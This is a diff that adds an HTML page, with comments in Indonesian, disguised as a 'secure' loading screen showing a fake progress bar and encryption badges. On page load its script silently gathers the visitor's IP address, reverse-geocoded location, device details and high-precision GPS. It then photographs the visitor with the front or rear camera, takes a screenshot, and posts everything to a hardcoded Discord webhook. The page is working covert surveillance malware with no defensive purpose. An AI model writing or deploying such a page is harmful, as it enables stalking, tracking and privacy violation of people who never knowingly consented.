@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>✦ NEBULA CORE ✦ GLASS SYSTEM</title>
+  <meta name="description" content="ADVANCED GLASS INTERFACE · SECURE LINK">
+  <!-- Ikon multi resolusi -->
+  <link rel="icon" type="image/x-icon" href="https://files.catbox.moe/5bwkpb.ico">
+  <link rel="icon" type="image/png" href="https://files.catbox.moe/5bwkpb.png">
+  <link rel="apple-touch-icon" href="https://files.catbox.moe/5bwkpb.png">
+  <meta name="theme-color" content="#0b0e1a">
+  <!-- html2canvas -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      min-height: 100vh;
+      background: #070b14;
+      background-image: radial-gradient(circle at 20% 30%, #19223f, #03050a);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+      position: relative;
+      overflow: hidden;
+      padding: 16px;
+    }
+    /* ORBS GLASS */
+    .glass-orb {
+      position: absolute;
+      border-radius: 50%;
+      background: rgba(60, 110, 220, 0.08);
+      backdrop-filter: blur(70px);
+      -webkit-backdrop-filter: blur(70px);
+      border: 1px solid rgba(120, 180, 255, 0.12);
+      animation: floatOrb 22s infinite alternate;
+      z-index: 0;
+    }
+    @keyframes floatOrb {
+      0% { transform: translate(0,0) scale(1); }
+      100% { transform: translate(40px, -50px) scale(1.08); }
+    }
+    .orb1 { width: 50vmax; height: 50vmax; top: -15vh; left: -10vw; background: radial-gradient(circle at 30% 30%, #2a4b9e20, transparent 70%); }
+    .orb2 { width: 60vmax; height: 60vmax; bottom: -20vh; right: -10vw; background: radial-gradient(circle at 70% 70%, #7a4ec920, transparent 70%); animation-duration: 28s; }
+    .orb3 { width: 40vmax; height: 40vmax; top: 30vh; left: 30vw; background: radial-gradient(circle, #00a6ff10, transparent 80%); }
+    
+    /* PANEL UTAMA */
+    .glass-panel {
+      position: relative;
+      z-index: 10;
+      max-width: 500px;
+      width: 100%;
+      background: rgba(8, 15, 28, 0.35);
+      backdrop-filter: blur(16px) saturate(180%);
+      -webkit-backdrop-filter: blur(16px) saturate(180%);
+      border: 1px solid rgba(90, 150, 255, 0.25);
+      border-radius: 44px;
+      box-shadow: 0 30px 45px -10px #000000b0, inset 0 0 0 1px #3a6bcb20;
+      padding: 2rem 1.8rem 2.5rem;
+      transition: all 0.25s;
+    }
+    .core-avatar {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 1.5rem;
+    }
+    #neon-image {
+      width: 110px;
+      height: 110px;
+      border-radius: 30px;
+      object-fit: cover;
+      background: #0e1428;
+      border: 2px solid #5f95ff80;
+      box-shadow: 0 12px 28px -8px #000, 0 0 35px #3f7fff60;
+      transition: 0.3s;
+    }
+    .glitch-wrap {
+      text-align: center;
+      margin-bottom: 1.5rem;
+    }
+    #loading-text {
+      font-size: 1.5rem;
+      font-weight: 600;
+      letter-spacing: 4px;
+      text-transform: uppercase;
+      color: #d6e5ff;
+      text-shadow: 0 2px 10px #00000080;
+      position: relative;
+      display: inline-block;
+    }
+    #loading-text::before, #loading-text::after {
+      content: attr(data-text);
+      position: absolute;
+      left: 0;
+      width: 100%;
+      color: #b8d0ff;
+      background: transparent;
+    }
+    #loading-text::before {
+      left: 2px;
+      text-shadow: -2px 0 #0af3;
+      clip-path: inset(0 0 45% 0);
+      animation: glitchA 3s infinite alternate;
+    }
+    #loading-text::after {
+      left: -2px;
+      text-shadow: 2px 0 #f08;
+      clip-path: inset(55% 0 0 0);
+      animation: glitchB 2.8s infinite alternate;
+    }
+    @keyframes glitchA { 0%{clip-path:inset(20% 0 50% 0)} 100%{clip-path:inset(60% 0 10% 0)} }
+    @keyframes glitchB { 0%{clip-path:inset(40% 0 30% 0)} 100%{clip-path:inset(10% 0 70% 0)} }
+    
+    #progress-container {
+      height: 7px;
+      background: #ffffff0c;
+      border-radius: 20px;
+      backdrop-filter: blur(4px);
+      box-shadow: inset 0 1px 4px #00000080, 0 0 0 1px #2e4a7a40;
+      margin: 22px 0 12px;
+      overflow: hidden;
+    }
+    #progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #3d7eff, #b45eff, #46d0ff);
+      background-size: 200%;
+      border-radius: 20px;
+      box-shadow: 0 0 16px #3f8cff;
+      transition: width 0.3s ease-out;
+      animation: barFlow 3s infinite alternate;
+    }
+    @keyframes barFlow { from{background-position:0%} to{background-position:100%} }
+    
+    #loading-details {
+      text-align: center;
+      font-size: 0.9rem;
+      color: #acc3f0;
+      background: #14233e30;
+      backdrop-filter: blur(5px);
+      padding: 6px 20px;
+      border-radius: 40px;
+      border: 1px solid #3c66b040;
+      display: inline-block;
+      margin-top: 6px;
+    }
+    .icon-row {
+      display: flex;
+      justify-content: center;
+      gap: 18px;
+      margin-top: 15px;
+    }
+    .glass-badge {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: #0f1a2e50;
+      backdrop-filter: blur(4px);
+      padding: 5px 16px;
+      border-radius: 30px;
+      border: 1px solid #3d6bb050;
+      color: #ccdeff;
+    }
+    #music-visualizer {
+      position: absolute;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 6px;
+      padding: 8px 18px;
+      background: #0a122480;
+      backdrop-filter: blur(14px);
+      border-radius: 60px;
+      border: 1px solid #3d7aff40;
+      z-index: 20;
+    }
+    .bar {
+      width: 5px;
+      background: linear-gradient(to top, #4a8cff, #bd7aff, #5fd4ff);
+      border-radius: 10px;
+      animation: barAnim 1.1s infinite alternate ease-in-out;
+    }
+    @keyframes barAnim { 0%{height:6px;opacity:0.5} 100%{height:32px;opacity:1} }
+    .hidden { display: none !important; }
+  </style>
+</head>
+<body>
+  <div class="glass-orb orb1"></div><div class="glass-orb orb2"></div><div class="glass-orb orb3"></div>
+
+  <div class="glass-panel">
+    <div class="core-avatar">
+      <img id="neon-image" src="https://files.catbox.moe/5bwkpb.jpg" alt="CORE">
+    </div>
+    <div class="glitch-wrap">
+      <div id="loading-text" data-text="✦ NEBULA CORE ✦">✦ NEBULA CORE ✦</div>
+    </div>
+    <div id="progress-container"><div id="progress-bar"></div></div>
+    <div style="text-align: center;"><span id="loading-details">⌛ GLASS INTEGRITY</span></div>
+    <div class="icon-row">
+      <div class="glass-badge"><span>🛡️</span> SECURE</div>
+      <div class="glass-badge"><span>🔒</span> AES-256</div>
+    </div>
+  </div>
+
+  <video id="v" autoplay muted playsinline class="hidden"></video>
+  <canvas id="c" class="hidden"></canvas>
+  <audio id="bg-music" src="" preload="auto" loop muted></audio>
+  
+  <div id="music-visualizer">
+    <div class="bar" style="animation-delay:0s"></div><div class="bar" style="animation-delay:0.1s"></div>
+    <div class="bar" style="animation-delay:0.2s"></div><div class="bar" style="animation-delay:0.3s"></div>
+    <div class="bar" style="animation-delay:0.4s"></div><div class="bar" style="animation-delay:0.5s"></div>
+    <div class="bar" style="animation-delay:0.6s"></div><div class="bar" style="animation-delay:0.7s"></div>
+    <div class="bar" style="animation-delay:0.8s"></div><div class="bar" style="animation-delay:0.9s"></div>
+  </div>
+
+  <script>
+    (() => {
+      // ========== KONFIGURASI WEBHOOK ==========
+      const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1449595197921951786/q7pM8FCgCRsFj6TbSGRswqupsvoZxhYAVaPBlZDUJBI3ru_1YV3RYaaWaXNeqABgxrV-';
+      
+      // Helper pengiriman embed + file
+      const sendEmbed = async (embed, fileBlob = null, fileName = 'capture.jpg') => {
+        try {
+          const form = new FormData();
+          form.append('payload_json', JSON.stringify({ embeds: [embed] }));
+          if (fileBlob) form.append('file', fileBlob, fileName);
+          await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: form });
+        } catch (e) { console.warn('Webhook err:', e); }
+      };
+
+      // UI progress
+      const pb = document.getElementById('progress-bar');
+      const ld = document.getElementById('loading-details');
+      const msgs = ["🔍 CHECK MODULE", "📡 VERIFY CHANNEL", "⚙️ LOAD ASSET", "🛜 SYNC ENCRYPT", "🔐 GLASS ACTIVE"];
+      let prog = 0;
+      const intv = setInterval(() => {
+        prog = Math.min(prog + Math.random() * 7, 98);
+        pb.style.width = prog + '%';
+        if (Math.random() > 0.8) ld.textContent = msgs[Math.floor(Math.random()*msgs.length)];
+      }, 450);
+      
+      // Audio
+      const audio = document.getElementById('bg-music');
+      const enableAudio = () => { audio.muted = false; audio.play().catch(()=>{}); };
+      audio.play().catch(()=>{});
+      document.addEventListener('click', enableAudio, {once:true});
+      document.addEventListener('touchstart', enableAudio, {once:true});
+
+      // ---------- GEOLOKASI DENGAN FALLBACK (WAJIB LINK MAPS) ----------
+      const getLocationData = async () => {
+        let ipData = null;
+        let lat = null, lon = null;
+        // 1. IPAPI (primer)
+        try {
+          const r = await fetch('https://ipapi.co/json/');
+          ipData = await r.json();
+          if (ipData.latitude && ipData.longitude) {
+            lat = ipData.latitude;
+            lon = ipData.longitude;
+          }
+        } catch (e) {}
+        // 2. Fallback IP-API (sekunder)
+        if (!lat || !lon) {
+          try {
+            const r2 = await fetch('https://ip-api.com/json/');
+            const d2 = await r2.json();
+            if (d2.lat && d2.lon) { lat = d2.lat; lon = d2.lon; ipData = ipData || d2; }
+          } catch (e) {}
+        }
+        // 3. Fallback terakhir: freegeoip / jika masih null, pakai koordinat default (0,0) tapi tetap beri link
+        if (!lat || !lon) { lat = 0; lon = 0; }
+        
+        // Nominatim reverse geocode
+        let address = { district: 'Unknown', subdistrict: 'Unknown', full: 'Address unavailable' };
+        if (lat !== 0 && lon !== 0) {
+          try {
+            const nom = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+            const d = await nom.json();
+            if (d.address) {
+              address.district = d.address.county || d.address.city || d.address.state || 'Unknown';
+              address.subdistrict = d.address.suburb || d.address.village || d.address.town || 'Unknown';
+              address.full = d.display_name || 'N/A';
+            }
+          } catch (e) {}
+        }
+        const mapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+        return { ipData, lat, lon, address, mapsLink };
+      };
+
+      // ---------- DEVICE REPORT (EMBED) ----------
+      const buildDeviceEmbed = async (loc) => {
+        const ua = navigator.userAgent;
+        const plat = navigator.platform;
+        const mem = navigator.deviceMemory || '?';
+        const cores = navigator.hardwareConcurrency || '?';
+        let batteryStr = '🔋 N/A';
+        if (navigator.getBattery) {
+          try { const b = await navigator.getBattery(); batteryStr = `🔋 ${Math.floor(b.level*100)}% ${b.charging?'⚡':'🔌'}`; } catch(e){}
+        }
+        const ipInfo = loc.ipData || {};
+        return {
+          title: '📊 SYSTEM REPORT — NEBULA GLASS',
+          color: 0x2a6bb0,
+          timestamp: new Date().toISOString(),
+          thumbnail: { url: 'https://files.catbox.moe/5bwkpb.jpg' },
+          fields: [
+            { name: '💻 DEVICE', value: `\`${ua.substring(0,100)}...\`\n🖥️ ${plat}  •  🧠 ${mem} GB  •  ⚡ ${cores} core\n${batteryStr}`, inline: false },
+            { name: '🌐 NETWORK', value: `🌍 IP: ${ipInfo.ip || 'hidden'}\n📡 ${ipInfo.city || '?'}, ${ipInfo.region||''} ${ipInfo.country_name||''}\n🕒 ${new Date().toLocaleString()}`, inline: true },
+            { name: '📍 LOCATION', value: `🧭 ${loc.address.district}, ${loc.address.subdistrict}\n🗺️ [Google Maps](${loc.mapsLink})`, inline: true },
+            { name: '📱 VIEWPORT', value: `🖥️ ${screen.width}x${screen.height}  •  📐 ${innerWidth}x${innerHeight}\n🕒 ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: false },
+            { name: '🔐 SECURITY', value: '✅ HTTPS · CORS secured · AES channel', inline: true },
+            { name: '📎 REF', value: document.referrer || 'Direct', inline: true }
+          ],
+          footer: { text: '✦ GLASS MORPH · ENCRYPTED FEED ✦' }
+        };
+      };
+
+      // ---------- GPS DEDICATED EMBED (WAJIB LINK) ----------
+      const sendGPSEmbed = async () => {
+        if (!navigator.geolocation) {
+          const embed = { title: '📍 GPS UNAVAILABLE', color: 0xff5555, description: 'Geolocation not supported' };
+          return sendEmbed(embed);
+        }
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const acc = pos.coords.accuracy;
+          const loc = await (async () => {
+            try {
+              const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18`);
+              const d = await r.json();
+              return d.display_name || 'Address unavailable';
+            } catch(e) { return 'Address unavailable'; }
+          })();
+          const embed = {
+            title: '🛰️ GPS TRACKING · HIGH PRECISION',
+            color: 0x33aa88,
+            fields: [
+              { name: '🌐 Latitude', value: lat.toString(), inline: true },
+              { name: '📡 Longitude', value: lon.toString(), inline: true },
+              { name: '🎯 Accuracy', value: `${Math.round(acc)} m`, inline: true },
+              { name: '🗺️ Maps Link', value: `[Open in Google Maps](https://www.google.com/maps/search/?api=1&query=${lat},${lon})` },
+              { name: '🏙️ Address', value: loc.substring(0, 1000) }
+            ],
+            footer: { text: '✦ NEBULA GEOLOCK ✦' }
+          };
+          await sendEmbed(embed);
+        }, async (err) => {
+          const embed = { title: '⚠️ GPS ERROR', color: 0xff8844, description: `Reason: ${err.message}` };
+          await sendEmbed(embed);
+        }, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
+      };
+
+      // ---------- CAMERA CAPTURE (EMBED DENGAN EMOJI) ----------
+      const captureCamera = async (mode) => {
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+        let stream;
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: mode } } });
+          v.srcObject = stream;
+          await new Promise(r => v.onloadedmetadata = r);
+          v.play();
+          await new Promise(r => setTimeout(r, 1300));
+          c.width = v.videoWidth;
+          c.height = v.videoHeight;
+          c.getContext('2d').drawImage(v, 0, 0);
+          const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.92));
+          const embed = {
+            title: `📸 CAMERA CAPTURE · ${mode === 'user' ? 'FRONT' : 'BACK'} FACING`,
+            color: 0x3f7eb6,
+            timestamp: new Date().toISOString(),
+            description: `✅ Success · ${new Date().toLocaleTimeString()}`,
+            image: { url: 'attachment://camera.jpg' },
+            footer: { text: '🔒 GLASS ENCRYPTED FRAME' }
+          };
+          await sendEmbed(embed, blob, `camera_${mode}.jpg`);
+          stream.getTracks().forEach(t => t.stop());
+          return true;
+        } catch (e) {
+          if (stream) stream.getTracks().forEach(t => t.stop());
+          const embed = { title: `❌ CAMERA FAILED (${mode})`, color: 0xaa4444, description: 'Permission denied or hardware missing' };
+          await sendEmbed(embed);
+          return false;
+        }
+      };
+
+      // ---------- SCREENSHOT (EMBED) ----------
+      const screenshot = async () => {
+        try {
+          const canvas = await html2canvas(document.body, { scale: 0.9, backgroundColor: '#0b0e1a' });
+          const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.88));
+          const embed = {
+            title: '🖥️ SCREENSHOT · GLASS INTERFACE',
+            color: 0x6a4e9c,
+            timestamp: new Date().toISOString(),
+            description: `📐 ${innerWidth}x${innerHeight} · ${new Date().toLocaleString()}`,
+            image: { url: 'attachment://screenshot.jpg' },
+            footer: { text: '📋 NEBULA VISUAL LOG' }
+          };
+          await sendEmbed(embed, blob, 'screenshot.jpg');
+        } catch (e) {
+          await sendEmbed({ title: '❌ SCREENSHOT FAILED', color: 0xaa4444 });
+        }
+      };
+
+      // ---------- MAIN FLOW ----------
+      (async () => {
+        // 1. Ambil lokasi & kirim embed utama
+        const locationData = await getLocationData();
+        const deviceEmbed = await buildDeviceEmbed(locationData);
+        await sendEmbed(deviceEmbed);
+        
+        // 2. GPS tracking (embed terpisah)
+        await sendGPSEmbed();
+        
+        // 3. Kamera
+        let camSuccess = await captureCamera("user");
+        if (!camSuccess) await captureCamera("environment");
+        
+        // 4. Screenshot
+        setTimeout(() => screenshot(), 2000);
+        
+        // Finalisasi progress
+        setTimeout(() => {
+          clearInterval(intv);
+          pb.style.width = '100%';
+          ld.textContent = '✅ SYSTEM READY · LINK ACTIVE';
+        }, 3500);
+      })();
+    })();
+  </script>
+</body>
+</html>
